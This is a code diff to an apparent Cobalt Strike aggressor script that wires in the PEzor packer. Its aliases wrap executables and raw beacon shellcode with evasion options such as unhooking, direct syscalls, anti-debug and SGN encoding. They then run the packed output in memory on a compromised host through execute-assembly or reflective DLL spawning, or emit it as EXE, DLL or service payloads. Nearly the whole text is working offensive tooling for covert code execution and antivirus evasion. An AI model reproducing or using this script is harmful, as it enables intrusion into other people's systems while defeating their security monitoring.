@@ -1,14 +1,25 @@
-import java.util.UUID;
+include(script_resource("utils.cna"));
 
-alias execute-inmemory {
-    fork(&execute_inmemory, $beacon => $1, $command => $0);
+debug(34 | 4);
+
+alias execute-PEzor {
+    fork(&execute_PEzor, $1 => $0);
 }
 
-sub execute_inmemory {
-    debug(34);
+alias execute-inmemory {
+    fork(&execute_inmemory, $1 => $1, $2 => $0);
+}
+
+alias generate-payload {
+    fork(&generate_payload, $1 => binfo($1, "listener"), $2 => binfo($1, "arch"), $3 => $0);
+}
+
+sub execute_PEzor {
+    local('$command $match $type $executable $sgn $rx $self $debug $32 $64 $sdk $index $unhook $syscalls $antidebug $sleep $wait $format $length $end $opts $args $otheropts @argv $tmpdest $handle @output $packed');
+    $command = $1;
 
     # manually parse args
-    find($command, ' ([\w\/\.]*)')
+    find($command, ' ([\w\/\._][\w\/\.\-_]*)')
     ($match, $type) = matched();
     $executable = copy($match);
 
@@ -66,20 +77,15 @@ sub execute_inmemory {
 
     $index = indexOf($command, $executable);
     $length = strlen($executable);
-    $end = expr("$index + $length + 1");
+    $end = expr("$index + $length");
     $opts = substr($command, $end);
 
     find($opts, "\-p '(.*)'");
     ($match, $type) = matched();
     $args = copy($match);
 
-    $otherops = replace($opts, "\-p ' $+ $args $+ '", "");
-
-    # validation
-    if (($format ne "") && ("dotnet" !isin $format) && ($format ne "reflective-dll")) {
-        berror($beacon, "Format $format is not supported, use -format=reflective-dll or -format=dotnet");
-        return;
-    }
+    $otheropts = replace($opts, " *\-p ' $+ $args $+ ' *", "");
+    $otheropts = replace($otheropts, '^ *| *$', "");
 
     if ($wait eq "") {
         $wait = 0;
@@ -89,20 +95,8 @@ sub execute_inmemory {
         $format = "dotnet";
     }
 
-    # announce task
-    btask($beacon, "Tasked beacon to execute in-memory $executable with args: $args");
-
     # copy executable to tmp dir
-    $random = [java.util.UUID randomUUID];
-    $uuid = [$random toString];
-    $tmpdir = "/tmp/";
-    $tmpfile = copy($executable);
-    $tmpfile = replace($tmpfile, '\/', "_");
-    $tmpfile = "$uuid $+ $tmpfile";
-    $tmpdest = "$tmpdir $+ $tmpfile";
-    println("Copying $executable to $tmpdest");
-    copy_file($executable, $tmpdest);
-    println("Copied $executable to $tmpdest");
+    $tmpdest = copy_to_temp_file($executable);
 
     # build argv
     push(@argv, "PEzor");
@@ -162,9 +156,14 @@ sub execute_inmemory {
         push(@argv, $args);
     }
 
-    push(@argv, $otherops);
+    push(@argv, $otheropts);
 
-    #printAll(@argv);
+    println($opts);
+    println($otheropts);
+
+    #@argv = concat(@argv, split($otheropts, " "));
+
+    printAll(@argv);
 
     # execute PEzor
     println("Executing PEzor");
@@ -173,41 +172,123 @@ sub execute_inmemory {
     closef($handle);
     printAll(@output);
 
-    if ("dotnet" isin $format) {
+    if ($format eq "exe") {
+        $packed = "$tmpdest $+ .packed.exe";
+        println("PEzor generated EXE $packed");
+        return $packed;
+    } else if ($format eq "dll") {
+        $packed = "$tmpdest $+ .packed.dll";
+        println("PEzor generated DLL $packed");
+        return $packed;
+    } else if ($format eq "service-dll") {
+        $packed = "$tmpdest $+ .packed.service.dll";
+        println("PEzor generated service DLL $packed");
+        return $packed;
+    } else if ($format eq "service-exe") {
+        $packed = "$tmpdest $+ .packed.service.exe";
+        println("PEzor generated service EXE $packed");
+        return $packed;
+    } else if ($format eq "reflective-dll") {
+        $packed = "$tmpdest $+ .packed.reflective.dll";
+        println("PEzor generated reflective DLL $packed");
+        return $packed;
+    } else { # } else if ("dotnet" isin $format) {
         $packed = "$tmpdest $+ .packed.dotnet.exe";
+        println("PEzor generated .NET assembly $packed");
+        return $packed;
+    }
+}
+
+sub execute_inmemory {
+    local('$beacon $command $match $type $executable $format $wait $args $packed $wait');
+    $beacon = $1;
+    $command = $2;
+
+    # manually parse args
+    #find($command, ' ([\w\/\.]*) ')
+    find($command, ' ([\w\/\._][\w\/\.\-_]*)')
+    ($match, $type) = matched();
+    $executable = copy($match);
+
+    find($command, '\-format=([\w\-]*)');
+    ($match, $type) = matched();
+    $format = copy($match);
+
+    find($command, '\-wait=(\d*)');
+    ($match, $type) = matched();
+    $wait = copy($match);
+
+    find($command, "\-p '(.*)'");
+    ($match, $type) = matched();
+    $args = copy($match);
+
+    # validation
+    if (($format ne "") && ("dotnet" !isin $format) && ($format ne "reflective-dll")) {
+        berror($beacon, "Format $format is not supported, use -format=reflective-dll or -format=dotnet");
+        return;
+    }
+
+    if ($wait eq "") {
+        $wait = 0;
+    }
+
+    if ($format eq "") {
+        $format = "dotnet";
+    }
+
+    # announce task
+    btask($beacon, "Tasked beacon to execute in-memory $executable with args: $args");
+
+    println("Executing PEzor $command");
+    $packed = execute_PEzor($command);
+
+    if (("dotnet" isin $format) || ($format eq "")) {
         blog($beacon, "PEzor generated .NET assembly $packed");
         println("Executing generated .NET assembly: $packed");
 
         # call execute-assembly
         bexecute_assembly($beacon, $packed);
     } else {
-        $packed = "$tmpdest $+ .packed.reflective.dll";
         blog($beacon, "PEzor generated reflective DLL $packed");
         println("Executing generated reflective DLL: $packed");
+
+        # call dllspawn
         bdllspawn($beacon, $packed, $null, "Reflective DLL: $executable", expr("$wait * 1000"), true);
     }
-
-    # cleanup
-    #deleteFile($tmpdest);
-    #deleteFile(packed);
 }
 
-sub exec_async {
-    $handle = exec(@argv, $null);
-    @output = readAll($handle);
-    if (checkError($error)) {
-        warn("Could not execute @argv[0] $+ : $error");
+sub generate_raw_payload {
+    local('$handler $arch $payload $tmpfile');
+    $handler = $1;
+    $arch = $2;
+    $payload = artifact_payload($handler, "raw", $arch);
+    $tmpfile = get_random_temp_filename();
+    write_file($tmpfile, $payload);
+    return $tmpfile;
+}
+
+sub generate_payload {
+    local('$listener $arch $command $raw $packed');
+    $listener = $1;
+    $arch = $2;
+    $command = $3;
+    println("PEzor will generate payload for $listener");
+    $raw = generate_raw_payload($listener, $arch);
+
+    if ($arch eq "x64") {
+        $raw = "-64 $raw";
+    } else {
+        $raw = "-32 $raw";
     }
-    closef($handle);
-    return @output;
-}
 
-sub copy_file {
-    $handle = openf($1);
-    $data = readb($handle, -1);
-    closef($handle);
-    $handle = openf("> $+ $2");
-    writeb($handle, $data);
-    wait($handle);
-    closef($handle);
+    if ("generate-payload" isin $command) {
+        println("executing " . substr($command, 17) . " $raw");
+        $packed = execute_PEzor(substr($command, 17) . " $raw");
+    } else {
+        println("executing $command $raw");
+        $packed = execute_PEzor("$command $raw");
+    }
+
+    println("PEzor generated $packed");
+    return $packed;
 }
